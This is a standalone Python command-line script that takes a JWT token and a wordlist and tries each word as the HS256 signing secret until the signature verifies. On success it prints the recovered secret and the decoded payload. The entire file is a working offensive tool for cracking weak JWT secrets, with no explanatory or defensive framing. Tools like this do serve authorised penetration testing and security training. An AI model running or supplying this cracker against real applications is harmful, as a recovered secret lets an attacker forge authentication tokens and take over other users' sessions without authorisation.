#!/usr/bin/env python

import jwt
import sys
import os

def load_wordlist(file_path):
    if not os.path.exists(file_path):
        print(f"[!] Wordlist file not found: {file_path}")
        sys.exit(1)
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def brute_force_jwt(token, secrets):
    try:
        header = jwt.get_unverified_header(token)
    except Exception as e:
        print(f"[!] Invalid JWT header: {e}")
        return None

    if header.get("alg") != "HS256":
        print(f"[!] Unsupported algorithm: {header.get('alg')}")
        return None

    for secret in secrets:
        try:
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            print(f"[+] Secret found: '{secret}'")
            print(f"[+] Payload: {decoded}")
            return secret
        except jwt.exceptions.InvalidSignatureError:
            continue
        except Exception as e:
            continue

    print("[-] No secret matched.")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <jwt_token> <wordlist.txt>")
        sys.exit(1)

    token = sys.argv[1]
    wordlist_path = sys.argv[2]

    secrets = load_wordlist(wordlist_path)
    brute_force_jwt(token, secrets)
    